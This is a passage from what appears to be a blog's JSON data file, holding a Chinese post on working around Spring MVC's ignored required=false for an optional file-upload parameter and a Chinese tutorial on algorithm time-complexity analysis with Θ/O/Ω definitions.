title=\"&#x95EE;&#x9898;\"></a>&#x95EE;&#x9898;</h3><p>&#x7531;&#x4E8E;&#x67D0;&#x4E9B;&#x539F;&#x56E0;&#xFF0C;&#x73B0;&#x5728;&#x9700;&#x8981;&#x8FD9;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x63A5;&#x53E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;type(String)&#x662F;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#xFF0C;photoFile(MultipartFile)&#x662F;&#x975E;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#xFF0C;&#x5373;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x9700;&#x8981;&#x63A5;&#x53D7;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x522B;&#x4E3A;photoFile&#x548C;type&#xFF0C;&#x4F46;&#x662F;&#x5076;&#x5C14;&#x53EA;&#x63A5;&#x53D7;type&#x53C2;&#x6570;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x8D77;&#x5230;&#x4E0A;&#x4F20;&#x4F5C;&#x7528;&#x3002;</p>\n<p>&#x6309;&#x5E38;&#x89C4;&#x5199;&#x6CD5;&#xFF0C;photoFile&#x53C2;&#x6570;&#x7684;required&#x914D;&#x7F6E;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E86;false&#x3002;</p>\n<p>&#x5948;&#x4F55;&#x8C03;&#x8BD5;&#x65F6;&#x53D1;&#x73B0;&#xFF0C;photoFile&#x7684;required&#x914D;&#x7F6E;&#x662F;&#x5931;&#x6548;&#x7684;&#x3002;&#x5373;&#x4E0B;&#x9762;&#x7684;&#x63A5;&#x53E3;&#x5199;&#x6CD5;&#xFF0C;photoFile&#x6210;&#x4E86;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = <span class=\"string\">&quot;/upload&quot;</span>)</span><br><span class=\"line\">public String uploadPics(@RequestPart(value = <span class=\"string\">&quot;photoFile&quot;</span>, required = <span class=\"literal\">false</span>) MultipartFile photoFile,</span><br><span class=\"line\">\t\t@RequestParam(value = <span class=\"string\">&quot;type&quot;</span>, required = <span class=\"literal\">true</span>) String <span class=\"built_in\">type</span>, HttpServletRequest request) throws Exception {</span><br><span class=\"line\">\t\t&#x3002;&#x3002;&#x3002;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>","more":"<p>&#x5F53;&#x6A21;&#x62DF;upload&#x63A5;&#x53E3;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x643A;&#x5E26;photoFile&#x53C2;&#x6570;&#xFF0C;&#x5982;&#x4E0A;&#x63A5;&#x53E3;&#x5199;&#x6CD5;&#x62A5;&#x9519;&#x5982;&#x4E0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">org.springframework.web.multipart.MultipartException: The current request is not a multipart request</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.assertIsMultipartRequest(RequestPartMethodArgumentResolver.java:178) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.resolveArgument(RequestPartMethodArgumentResolver.java:116) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:79) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:157) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:124) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:749) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:690) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:945) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\t...</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"&#x65B9;&#x6848;\"><a href=\"#&#x65B9;&#x6848;\" class=\"headerlink\" title=\"&#x65B9;&#x6848;\"></a>&#x65B9;&#x6848;</h3><p>required&#x914D;&#x7F6E;&#x5931;&#x6548;&#xFF0C;&#x4F30;&#x8BA1;&#x662F;&#x6CA1;&#x6709;&#x8D70;required&#x7684;&#x76F8;&#x5173;&#x6D41;&#x7A0B;&#x3002;<br>&#x6211;&#x4EEC;&#x6839;&#x636E;&#x6240;&#x62A5;&#x7684;&#x7B2C;&#x4E09;&#x884C;&#x9519;&#x8BEF;&#xFF0C;&#x8FDB;&#x5165;RequestPartMethodArgumentResolver.class&#x7684;&#x6E90;&#x7801;&#x7684;116&#x884C;&#x67E5;&#x770B;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">111\t\t@Override</span><br><span class=\"line\">112\t\tpublic Object resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer,</span><br><span class=\"line\">113\t\t\t\tNativeWebRequest request, WebDataBinderFactory binderFactory) throws Exception {</span><br><span class=\"line\">114</span><br><span class=\"line\">115\t\t\tHttpServletRequest servletRequest = request.getNativeRequest(HttpServletRequest.class);</span><br><span class=\"line\">116\t\t\tassertIsMultipartRequest(servletRequest);</span><br><span class=\"line\">117</span><br><span class=\"line\">118\t\t\tMultipartHttpServletRequest multipartRequest =</span><br><span class=\"line\">119\t\t\t\tWebUtils.getNativeRequest(servletRequest, MultipartHttpServletRequest.class);</span><br><span class=\"line\">120</span><br><span class=\"line\">121\t\t\tString partName = getPartName(parameter);</span><br><span class=\"line\">122\t\t\tObject arg;</span><br><span class=\"line\">123</span><br><span class=\"line\">124\t\t\t<span class=\"keyword\">if</span> (MultipartFile.class.equals(parameter.getParameterType())) {</span><br><span class=\"line\">125\t\t\t\tAssert.notNull(multipartRequest, <span class=\"string\">&quot;Expected MultipartHttpServletRequest: is a MultipartResolver configured?&quot;</span>);</span><br><span class=\"line\">126\t\t\t\targ = multipartRequest.getFile(partName);</span><br><span class=\"line\">\t\t\t}</span><br><span class=\"line\">\t\t  .....</span><br></pre></td></tr></table></figure></p>\n<p>&#x518D;&#x70B9;&#x51FB;116&#x884C;&#xFF0C;&#x8FDB;&#x5165;assertIsMultipartRequest&#x65B9;&#x6CD5;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">175\t\tprivate static void assertIsMultipartRequest(HttpServletRequest request) {</span><br><span class=\"line\">176\t\t\tString contentType = request.getContentType();</span><br><span class=\"line\">177\t\t\t<span class=\"keyword\">if</span> (contentType == null || !contentType.toLowerCase().startsWith(<span class=\"string\">&quot;multipart/&quot;</span>)) {</span><br><span class=\"line\">178\t\t\t\tthrow new MultipartException(<span class=\"string\">&quot;The current request is not a multipart request&quot;</span>);</span><br><span class=\"line\">179\t\t\t}</span><br><span class=\"line\">\t\t}</span><br></pre></td></tr></table></figure></p>\n<p>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x9519;&#x8BEF;&#x5C31;&#x662F;178&#x884C;&#x89E6;&#x53D1;&#x7684;&#x3002;&#x800C;&#x4E14;&#x5728;&#x4E0A;&#x5C42;&#x7684;&#x51E0;&#x4E2A;&#x8C03;&#x7528;&#x4E2D;&#x4E5F;&#x6CA1;&#x6709;&#x6D89;&#x53CA;&#x5230;required&#x7684;&#x6D41;&#x7A0B;&#x3002;<br>&#x90A3;&#x4E48;&#x95EE;&#x9898;&#x6765;&#x4E86;, &#x63A5;&#x53E3;&#x5076;&#x5C14;&#x9700;&#x8981;&#x8D77;&#x5230;&#x4E0A;&#x4F20;&#x4F5C;&#x7528;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x6539;&#x53D8;&#x63A5;&#x53E3;&#x4F20;&#x53C2;&#x5F62;&#x5F0F;&#xFF0C;&#x5C31;&#x53EA;&#x80FD;&#x6539;&#x6E90;&#x7801;&#x4E86;&#xFF0C;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x4E0D;&#x662F;&#x597D;&#x7684;&#x65B9;&#x6848;&#x3002;</p>\n<p><strong>&#x90A3;&#x7B54;&#x6848;&#x80AF;&#x5B9A;&#x5C31;&#x5728;&#x6E90;&#x7801;&#x91CC;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x5F88;&#x5BB9;&#x6613;&#x5C31;&#x60F3;&#x5230;&#x53EF;&#x4EE5;&#x5728;&#x63A5;&#x53E3;&#x5904;&#x5B8C;&#x5168;&#x53BB;&#x6389;photoFile(MultipartFile)&#x53C2;&#x6570;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6A21;&#x4EFF;&#x6E90;&#x7801;&#xFF0C;&#x4ECE;request&#x91CC;&#x53BB;&#x83B7;&#x53D6;MultipartFile&#x5BF9;&#x8C61;&#x3002;</strong></p>\n<p>&#x4E0B;&#x9762;&#x662F;&#x6839;&#x636E;&#x6E90;&#x7801;118-126&#x884C;&#x3001;176-179&#x884C;&#x4FEE;&#x6539;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x7ECF;&#x6D4B;&#x8BD5;&#x662F;&#x53EF;&#x884C;&#x7684;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = <span class=\"string\">&quot;/upload&quot;</span>)</span><br><span class=\"line\">public String uploadPics(@RequestParam(value = <span class=\"string\">&quot;type&quot;</span>, required = <span class=\"literal\">true</span>) String <span class=\"built_in\">type</span>,</span><br><span class=\"line\">\t\tHttpServletRequest request) {</span><br><span class=\"line\">\t....</span><br><span class=\"line\">\t// &#x68C0;&#x6D4B;&#x662F;&#x5426;&#x4E3A;&#x4E0A;&#x4F20;&#x8BF7;&#x6C42;</span><br><span class=\"line\">\tString contentType = request.getContentType();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (contentType != null &amp;&amp; contentType.toLowerCase().startsWith(<span class=\"string\">&quot;multipart/&quot;</span>)) {</span><br><span class=\"line\">\t\tMultipartHttpServletRequest multipartRequest =</span><br><span class=\"line\">\t\t\t\tWebUtils.getNativeRequest(request, MultipartHttpServletRequest.class);</span><br><span class=\"line\">\t\tMultipartFile file = multipartRequest.getFile(<span class=\"string\">&quot;file&quot;</span>);   </span><br><span class=\"line\">\t\t....</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t....</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"&#x540E;&#x8BB0;\"><a href=\"#&#x540E;&#x8BB0;\" class=\"headerlink\" title=\"&#x540E;&#x8BB0;\"></a>&#x540E;&#x8BB0;</h3><p>&#x95EE;&#x9898;&#x7684;&#x5904;&#x7406;&#x5176;&#x5B9E;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x8FB9;&#x6587;&#x7AE0;&#x7684;&#x8BB0;&#x5F55;&#x662F;&#x4E3A;&#x4E86;&#x53E6;&#x4E00;&#x4EF6;&#x4E8B;&#x3002;</p>\n<p>&#x5F53;&#x65F6;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#x65F6;&#xFF0C;&#x53D1;&#x73B0;&#x5E38;&#x89C4;&#x5199;&#x6CD5;&#x8D70;&#x4E0D;&#x901A;&#xFF0C;&#x53C8;&#x4E0D;&#x597D;&#x6539;&#x6E90;&#x7801;&#xFF0C;&#x5185;&#x5FC3;&#x662F;&#x6709;&#x8349;&#x6CE5;&#x9A6C;&#x5954;&#x817E;&#x800C;&#x8FC7;&#x7684;&#x3002;</p>\n<p>&#x77E5;&#x9053;&#x7B54;&#x6848;&#x53EF;&#x80FD;&#x5728;&#x6E90;&#x7801;&#x91CC;&#xFF0C;&#x731C;&#x60F3;&#x53EF;&#x4EE5;&#x53BB;&#x7528;request&#x83B7;&#x53D6;MultipartFile&#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x53C8;&#x89C9;&#x5F97;&#x9EBB;&#x70E6;&#xFF0C;&#x4E0D;&#x60F3;&#x53BB;&#x5E72;&#x8FD9;&#x4E8B;&#xFF0C;&#x60F3;&#x7740;&#x53EF;&#x80FD;&#x6709;&#x66F4;&#x597D;&#x7684;&#x529E;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x4E8B;&#x5C31;&#x62D6;&#x7740;&#x3002;</p>\n<p>&#x5230;&#x540E;&#x6765;&#x95EE;&#x540C;&#x4E8B;&#x600E;&#x4E48;&#x89E3;&#x51B3;&#xFF0C;&#x540C;&#x4E8B;&#x8BF4;&#x90A3;&#x5C31;&#x4ECE;request&#x83B7;&#x53D6;MultipartFile&#x5BF9;&#x8C61;&#x54AF;&#x3002;:-O</p>\n<p><strong>&#x5176;&#x5B9E;&#x5DE5;&#x4F5C;&#x7ECF;&#x5E38;&#x78B0;&#x5230;&#x8FD9;&#x7C7B;&#x4E8B;&#x60C5;&#xFF0C;&#x4F46;&#x662F;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x90A3;&#x4E9B; &#x201C;&#x8C8C;&#x4F3C;&#x9065;&#x8FDC;&#x7684;&#x8DEF;&#x9014;&#x201D; &#x624D;&#x662F;&#x771F;&#x6B63;&#x7684;&#x6377;&#x5F84; ~</strong></p>"},{"title":"算法复杂度分析","date":"2016-07-27T14:10:00.000Z","_content":"\n### 前言\n通常，对于一个给定的算法，我们要做两项分析。<font style=\"color:red;\">第一是从数学上证明算法的正确性</font>，这一步主要用到形式化证明的方法及相关推理模式，如循环不变式、数学归纳法等。而在证明算法是正确的基础上，<font style=\"color:red;\">第二就是分析算法的时间复杂度。</font>算法的时间复杂度反映了程序执行时间随输入规模增长而增长的量级，在很大程度上能很好反映出算法的优劣与否。因此，作为程序员，掌握基本的算法时间复杂度分析方法是很有必要的。\n      \n但是很多朋友并不能清晰的理解这一概念，究其原因，主要是因为没有从数学层面上理解其本质，而是习惯于从直观理解。下面，我们就一步步走近算法时间复杂度的数学本质。\n\n---\n\n### 算法时间复杂度的数学意义\n      \n**从数学上定义，给定算法A，如果存在函数F(n)，当n=k时，F(k)表示算法A在输入规模为k的情况下的运行时间，则称F(n)为算法A的时间复杂度。**\n\n> 另一种定义：\n一般情况下，算法中基本操作重复执行的次数是问题规模n的某个函数，用T(n)表示，若有某个辅助函数f(n)，使得当n趋近于无穷大时，T(n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=O(f(n))，称O(f(n))为算法的渐进时间复杂度(O是数量级的符号 )，简称时间复杂度。\n      \n这里我们首先要明确输入规模的概念。关于输入规模，不是很好下定义，非严格的讲，输入规模是指算法A所接受输入的自然独立体的大小。例如，对于排序算法来说，输入规模一般就是待排序元素的个数，而对于求两个同型方阵乘积的算法，输入规模可以看作是单个方阵的维数。为了简单起见，在下面的讨论中，我们总是假设算法的输入规模是用大于零的整数表示的，即n=1,2,3,……,k,……\n      \n我们还知道，对于同一个算法，每次执行的时间不仅取决于输入规模，还取决于输入的特性和具体的硬件环境在某次执行时的状态。所以想要得到一个统一精确的F(n)是不可能的。为了解决这个问题，我们做一下两个说明：\n1.忽略硬件及环境因素，假设每次执行时硬件条件和环境条件是完全一致的。\n2.对于输入特性的差异，我们将从数学上进行精确分析并带入函数解析式。\n\n---\n\n### 算法时间复杂度分析示例\n为了便于朋友们理解，我将不会采用教科书上惯用的快速排序、合并排序等经典示例进行分析，而是使用一个十分简单的算法作为示例。我们先来定义问题。\n      \n问题定义：\n输入——此问题输入为一个有序序列，其元素个数为n，n为大于零的整数。序列中的元素为从1到n这n个整数，但其顺序为完全随机。\n输出——元素n所在的位置。（第一个元素位置为1）\n\n这个问题非常简单，下面直接给出其解决算法之一（伪代码）：\n```bash\nLocationN(A)\n{\n    for(int i=1;i<=n;i++)-----------------------t1\n    {\n          if(A[i] == n) ----------------------------t2\n                { return i; }------------------------t3\n    }\n}\n```\n\n我们来看看这个算法。其中t1、t2和t3分别表示此行代码执行一次需要的时间。\n\n首先，输入规模n是影响算法执行时间的因素之一。在n固定的情况下，不同的输入序列也会影响其执行时间。最好情况下，n就排在序列的第一个位置，那么此时的运行时间为“t1+t2+t3”。最坏情况下，n排在序列最后一位，则运行时间为“n*t1+n*t2+t3=(t1+t2)*n+t3”。可以看到，最好情况下运行时间是一个常数，而最坏情况下运行时间是输入规模的线性函数。那么，平均情况如何呢？\n\n问题定义说输入序列完全随机，即n出现在1...n这n个位置上是等可能的，即概率均为1/n。而平均情况下的执行次数即为执行次数的数学期望，其解为：\n```bash\nE\n= p(n=1)*1+p(n=2)*2+...+p(n=n)*n\n= (1/n)*(1+2+...+n)\n= (1/n)*((n/2)*(1+n))\n= (n+1)/2\n```\n\n即在平均情况下for循环要执行(n+1)/2次，则平均运行时间为“(t1+t2)*(n+1)/2+t3”。\n由此我们得出分析结论：\n**t1+t2+t3 <= F(n) <= (t1+t2)*n+t3，在平均情况下F(n) = (t1+t2)*(n+1)/2+t3**\n\n---\n\n### 算法的渐近时间复杂度\n\n**以上分析，我们对算法的时间复杂度F(n)进行了精确分析。但是，很多时候，我们不需要进行如此精确的分析，原因有下：\n1.在较复杂的算法中，进行精确分析是非常复杂的。\n2.实际上，大多数时候我们并不关心F(n)的精确度量，而只是关心其量级。**\n\n基于此，提出渐近时间复杂度的概念。在正式给出渐近时间复杂度之前，要先给出几个数学定义：\n```bash\n定义一：Θ(g(n))={f(n) | 如果存在正常数c1、c2和正整数n0，使得当n>=n0时，0<c1g(n)<=f(n)<=c2g(n)恒成立}\n定义二：Ο(g(n))={f(n) | 如果存在正常数c和正整数n0，使得当n>=n0时，0<=f(n)<=cg(n)恒成立}\n定义三：Ω(g(n))={f(n) | 如果存在正常数c和正整数n0，使得当n>=n0时，0<=cg(n)<=f(n)恒成立}\n```\n\n可以看到，三个定义其实都定义了一个函数集合，只不过集合中的函数需要满足的条件不同。有了以上定义，就可以定义渐近时间复杂度了。\n      \n不过这里还有个问题：F(n)不是确定的，他是在一个范围内变动的，那么我们关心哪个F(n)呢？一般我们在分析算法时，使用最坏情况下的F(n)来评价算法效率，原因有如下两点：\n1.如果知道了最坏情况，我们就可以保证算法在任何时候都不能比这个情况更坏了。\n2.很多时候，算法运行发生最坏情况的概率还是很大的，如查找问题中待查元素不存在的情况。且在很多时候，平均情况的渐近时间复杂度和最坏情况的渐近时间复杂度是一个量级的。\n\n于是给出如下定义：设F(n)为算法A在最坏情况下F(n)，则如果F(n)属于Θ(g(n))，则说算法A的渐近时间复杂度为g(n)，且g(n)为F(n)的渐近确界。\n\n还是以上面的例子为例，则在上面定义中F(n) = (t1+t2)*n+t3。则F(n)的渐近确界为n，其证明如下：\n```bash\n证明：\n设c1=t1+t2，c2=t1+t2+t3，n0=2\n又因为 t1,t2,t3均大于0\n则，当n>n0时，0<c1n<=F(n)<=c2n 即 0<(t1+t2)*n<=(t1+t2)*n+t3<=(t1+t2+t3)*n恒成立。\n所以 F(n)属于Θ(n)\n所以 n是F(n)的渐近确界\n证毕\n```\n\n<font style=\"color:red;\">在实际应用中，我们一般都是使用渐近时间复杂度代替实际时间复杂度来进行算法效率分析。</font>一般认为，一个渐近复杂度为n的算法要优于渐近复杂度为n^2的算法。\n\n注意，这并不是说渐近复杂度为n的算法在任何情况下都一定更高效，而是说在输入规模足够大后（大于临界条件n0），则前一个算法的最坏情况总是好于后一个算法的最坏情况。事实证明，在实践中这种分析是合理且有效的。\n\n类似的，还可以给出算法时间复杂度的上确界和下确界 ：\n```bash\n设F(n)为算法A在最坏情况下F(n)，则如果F(n)属于Ο(g(n))，则说算法A的渐近时间复杂度上限为g(n)，且g(n)为F(n)的渐近上确界。\n设F(n)为算法A在最坏情况下F(n)，则如果F(n)属于Ω(g(n))，则说算法A的渐近时间复杂度下限为g(n)，且g(n)为F(n)的渐近下确界。\n```\n这里一定要注意，由于我们是以F(n)最坏情况分析的，所以，我们可以100%保证在输入规模超过临界条件n0时，算法的运行时间一定不会高于渐近上确界，但是并不能100%保证算法运行时间不会低于渐近下确界，而只能100%保证算法的最坏运行时间不会低于渐近下确界。\n\n---\n\n### 相关链接\n算法的时间复杂度和空间复杂度总结：http://blog.csdn.net/zolalad/article/details/11848739","source":"_posts/算法复杂度分析.md","raw":"---\ntitle: 算法复杂度分析\ncategories:\n  - 算法及理论\ntags:\n  - 算法复杂度\ndate: 2016-7-27 22:10:00\n\n---\n\n### 前言\n通常，对于一个给定的算法，我们要做两项分析。<font style=\"color:red;\">第一是从数学上证明算法的正确性</font>，这一步主要用到形式化证明的方法及相关推理模式，如循环不变式、数学归纳法等。而在证明算法是正确的基础上，<font style=\"color:red;\">第二就是分析算法的时间复杂度。</font>算法的时间复杂度反映了程序执行时间随输入规模增长而增长的量级，在很大程度上能很好反映出算法的优劣与否。因此，作为程序员，掌握基本的算法时间复杂度分析方法是很有必要的。\n      \n但是很多朋友并不能清晰的理解这一概念，究其原因，主要是因为没有从数学层面上理解其本质，而是习惯于从直观理解。下面，我们就一步步走近算法时间复杂度的数学本质。\n\n---\n\n### 算法时间复杂度的数学意义\n      \n**从数学上定义，给定算法A，如果存在函数F(n)，当n=k时，F(k)表示算法A在输入规模为k的情况下的运行时间，则称F(n)为算法A的时间复杂度。**\n\n> 另一种定义：\n一般情况下，算法中基本操作重复执行的次数是问题规模n的某个函数，用T(n)表示，若有某个辅助函数f(n)，使得当n趋近于无穷大时，T(n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=O(f(n))，称O(f(n))为算法的渐进时间复杂度(O是数量级的符号 )，简称时间复杂度。\n      \n这里我们首先要明确输入规模的概念。关于输入规模，不是很好下定义，非严格的讲，输入规模是指算法A所接受输入的自然独立体的大小。例如，对于排序算法来说，输入规模一般就是待排序元素的个数，而对于求两个同型方阵乘积的算法，输入规模可以看作是单个方阵的维数。为了简单起见，在下面的讨论中，我们总是假设算法的输入规模是用大于零的整数表示的，即n=1,2,3,……,k,……\n      \n我们还知道，对于同一个算法，每次执行的时间不仅取决于输入规模，还取决于输入的特性和具体的硬件环境在某次执行时的状态。所以想要得到一个统一精确的F(n)是不可能的。为了解决这个问题，我们做一下两个说明：\n1.忽略硬件及环境因素，假设每次执行时硬件条件和环境条件是完全一致的。\n2.对于输入特性的差异，我们将从数学上进行精确分析并带入函数解析式。\n\n---\n\n### 算法时间复杂度分析示例\n为了便于朋友们理解，我将不会采用教科书上惯用的快速排序、合并排序等经典示例进行分析，而是使用一个十分简单的算法作为示例。我们先来定义问题。\n      \n问题定义：\n输入——此问题输入为一个有序序列，其元素个数为n，n为大于零的整数。序列中的元素为从1到n这n个整数，但其顺序为完全随机。\n输出——元素n所在的位置。（第一个元素位置为1）\n\n这个问题非常简单，下面直接给出其解决算法之一（伪代码）：\n```bash\nLocationN(A)\n{\n    for(int i=1;i<=n;i++)-----------------------t1\n    {\n          if(A[i] == n) ----------------------------t2\n                { return i; }------------------------t3\n    }\n}\n```\n\n我们来看看这个算法。其中t1、t2和t3分别表示此行代码执行一次需要的时间。\n\n首先，输入规模n是影响算法执行时间的因素之一。在n固定的情况下，不同的输入序列也会影响其执行时间。最好情况下，n就排在序列的第一个位置，那么此时的运行时间为“t1+t2+t3”。最坏情况下，n排在序列最后一位，则运行时间为“n*t1+n*t2+t3=(t1+t2)*n+t3”。可以看到，最好情况下运行时间是一个常数，而最坏情况下运行时间是输入规模的线性函数。那么，平均情况如何呢？\n\n问题定义说输入序列完全随机，即n出现在1...n这n个位置上是等可能的，即概率均为1/n。而平均情况下的执行次数即为执行次数的数学期望，其解为：\n```bash\nE\n= p(n=1)*1+p(n=2)*2+...+p(n=n)*n\n= (1/n)*(1+2+...+n)\n= (1/n)*((n/2)*(1+n))\n= (n+1)/2\n```\n\n即在平均情况下for循环要执行(n+1)/2次，则平均运行时间为“(t1+t2)*(n+1)/2+t3”。\n由此我们得出分析结论：\n**t1+t2+t3 <= F(n) <= (t1+t2)*n+t3，在平均情况下F(n) = (t1+t2)*(n+1)/2+t3**\n\n---\n\n### 算法的渐近时间复杂度\n\n**以上分析，我们对算法的时间复杂度F(n)进行了精确分析。但是，很多时候，我们不需要进行如此精确的分析，原因有下：\n1.在较复杂的算法中，进行精确分析是非常复杂的。\n2.实际上，大多数时候我们并不关心F(n)的精确度量，而只是关心其量级。**\n\n基于此，提出渐近时间复杂度的概念。在正式给出渐近时间复杂度之前，要先给出几个数学定义：\n```bash\n定义一：Θ(g(n))={f(n) | 如果存在正常数c1、c2和正整数n0，使得当n>=n0时，0<c1g(n)<=f(n)<=c2g(n)恒成立}\n定义二：Ο(g(n))={f(n) | 如果存在正常数c和正整数n0，使得当n>=n0时，0<=f(n)<=cg(n)恒成立}\n定义三：Ω(g(n))={f(n) | 如果存在正常数c和正整数n0，使得当n>=n0时，0<=cg(n)<=f(n)恒成立}\n```\n\n可以看到，三个定义其实都定义了一个函数集合，只不过集合中的函数需要满足的条件不同。有了以上定义，就可以定义渐近时间复杂度了。\n      \n不过这里还有个问题：F(n)不是确定的，他是在一个范围内变动的，那么我们关心哪个F(n)呢？一般我们在分析算法时，使用最坏情况下的F(n)来评价算法效率，原因有如下两点：\n1.如果知道了最坏情况，我们就可以保证算法在任何时候都不能比这个情况更坏了。\n2.很多时候，算法运行发生最坏情况的概率还是很大的，如查找问题中待查元素不存在的情况。且在很多时候，平均情况的渐近时间复杂度和最坏情况的渐近时间复杂度是一个量级的。\n\n于是给出如下定义：设F(n)为算法A在最坏情况下F(n)，则如果F(n)属于Θ(g(n))，则说算法A的渐近时间复杂度为g(n)，且g(n)为F(n)的渐近确界。\n\n还是以上面的例子为例，则在上面定义中F(n) = (t1+t2)*n+t3。则F(n)的渐近确界为n，其证明如下：\n```bash\n证明：\n设c1=t1+t2，c2=t1+t2+t3，n0=2\n又因为 t1,t2,t3均大于0\n则，当n>n0时，0<c1n<=F(n)<=c2n 即 0<(t1+t2)*n<=(t1+t2)*n+t3<=(t1+t2+t3)*n恒成立。\n所以 F(n)属于Θ(n)\n所以 n是F(n)的渐近确界\n证毕\n```\n\n<font 